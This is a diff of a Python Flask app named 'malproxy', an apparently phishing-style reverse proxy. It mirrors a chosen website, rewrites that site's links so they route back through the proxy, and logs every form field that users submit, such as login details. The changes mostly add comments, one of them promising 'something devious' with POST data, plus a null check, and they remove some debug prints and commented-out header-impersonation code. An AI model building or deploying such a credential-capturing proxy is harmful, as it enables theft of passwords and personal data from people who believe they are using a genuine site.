@@ -11,34 +11,27 @@ link = ''
 
 @app.route('/', defaults={'path': ''}, methods=['POST', 'GET'])
 def malproxy(path):
-    # TODO
     global WEBSITE
+    # A link variable which contains the scheme in addition to the netloc
     global link
     parsed = urlparse(WEBSITE)
     link = WEBSITE
     if(not parsed.scheme):
         link = f'https://{WEBSITE}'
+    # In the case of a post request, we'll do something devious...
     if(request.method == 'POST'):
         for key in request.form:
             print(f'{key}: {request.form[key]}')
     r = requests.request(request.method, f'{link}{path}')
     contentType = r.headers.get('Content-Type')
+    # In case of html text, replace all the links
     if('text/html' in contentType):
         return replaceurls(r.text)
     return r.content
 
+# If the user accesses any paths at the same netloc, we want to continue proxying
 @app.route('/<path:path>', methods=['POST', 'GET'])
 def proxycont(path):
-    ## Attempting to impersonate client, perhaps continue trying
-    # headers = {}
-    # for pair in request.headers:
-    #     headers[pair[0]] = pair[1]
-    # headers['Referer'] = f'{WEBSITE}'
-    # headers['Host'] = f'{WEBSITE}'
-    # print(f'{WEBSITE}/{path}')
-
-    s = requests.Session()
-    s.headers.update({'User-Agent':request.headers.get('User-Agent')})
     if(request.method == 'POST'):
         for key in request.form:
             print(f'{key}: {request.form[key]}')
@@ -50,14 +43,18 @@ def proxycont(path):
 
 def replaceurls(text):
         global WEBSITE
+        # find all instances of hyperlinks, and edit them starting from the penultimate link
         links = [m.start() for m in re.finditer('<a ', text)]
         links.reverse()
         newResponse = text
-        print(type(links))
         pattern = re.compile("""(?<=href=)("|')(.*?)("|')""")
+        # Find the indices of each link, then replace with a proxy link
         for instance in links:
             m = pattern.search(text, instance)
-            rawLink = m.group()
+            if m:
+                rawLink = m.group()
+            else:
+                continue
             strippedLink = rawLink.strip('"')
             someURL = urlparse(strippedLink)
             # print(someURL.netloc, WEBSITE)
@@ -67,7 +64,6 @@ def replaceurls(text):
                 selfParsed = urlparse(myurl)
                 replaced = someURL._replace(netloc=selfParsed.netloc)
                 newurl = replaced.geturl()
-                print(newurl)
                 newResponse = f'{newResponse[0:indexPair[0]]}"{newurl}"{newResponse[indexPair[1]:]}'
         return newResponse
 
